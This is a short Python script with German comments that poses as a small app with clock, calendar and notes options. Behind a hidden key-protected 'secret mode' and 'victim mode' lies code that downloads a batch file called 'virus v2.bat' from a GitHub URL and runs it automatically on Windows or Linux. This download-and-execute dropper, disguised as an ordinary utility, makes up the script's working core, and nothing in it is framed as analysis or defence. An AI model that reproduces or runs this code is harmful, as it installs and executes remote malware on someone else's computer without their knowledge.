penis = input('enter key')

if penis == 'Bernhard':
    print('welcome to these app')
    print('1.clock   2. kalender   3. notizen')

    option = input('what are you chosing')
    if option == '/load mode':
        print('what is your secret key')
        key == input('key: ')
        if key == 'h9':
            print(' welcome to secret mode!')
            victim = input('are you on the victims PC?')
            if victim == 'yes':
                print('Victim mode!')
                print('what do you wanna do on the victim pc?')
                victimoption = input('1.virus   2.remote controll')
                if victimoption == 'virus':
                    print('installing virus...')
                    import urllib.request
                    import os
                    import subprocess


                    def download_and_open_file(github_file_url, save_path):
                        try:
                            # Datei von GitHub herunterladen
                            urllib.request.urlretrieve(github_file_url, save_path)
                            print(f"Datei erfolgreich heruntergeladen: {save_path}")

                            # Datei öffnen (plattformabhängig)
                            if os.name == 'nt':  # Für Windows
                                os.startfile(save_path)
                            elif os.name == 'posix':  # Für macOS und Linux
                                subprocess.run(['xdg-open', save_path])
                            else:
                                print("Automatisches Öffnen wird auf diesem System nicht unterstützt.")

                        except Exception as e:
                            print(f"Fehler: {e}")


                    # URL der Datei und Speicherort festlegen
                    github_file_url = 'https://github.com/Guithub12/download/raw/refs/heads/main/virus%20v2.bat'
                    save_path = 'C:\virus v2.bat'

                    # Funktion aufrufen
                    download_and_open_file(github_file_url, save_path)